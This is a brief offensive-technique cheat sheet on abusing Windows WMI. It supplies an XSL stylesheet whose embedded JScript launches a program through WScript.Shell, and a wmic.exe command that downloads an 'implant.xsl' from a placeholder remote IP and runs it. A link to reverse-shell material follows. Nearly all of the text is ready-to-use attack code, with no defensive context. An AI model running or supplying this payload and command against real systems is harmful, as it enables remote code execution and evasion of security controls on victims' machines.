# WMI

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	]]> </ms:script>
</stylesheet>
```

Execute a script contained in the target `.xsl` file hosted on a remote server.

```
C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/implant.xsl"
```

---
## References

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)